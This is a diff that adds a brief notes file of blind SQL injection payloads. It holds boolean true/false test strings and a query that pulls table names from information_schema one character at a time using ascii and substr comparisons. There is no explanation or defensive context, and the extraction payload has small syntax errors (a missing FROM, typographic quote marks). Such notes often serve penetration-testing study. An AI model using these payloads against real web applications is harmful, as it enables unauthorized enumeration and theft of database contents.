@@ -1,0 +1,11 @@
+SUBSTRING(string[name of database], start of database, length)
+
+
+1' AND '1'='1  Returns true
+
+1' AND '1'='0 Returns false
+
+
+id=1′ AND (ascii(substr((select table_name information_schema.tables where table_schema=database()limit 0,1) ,1,1)) < 105 –+
+
+
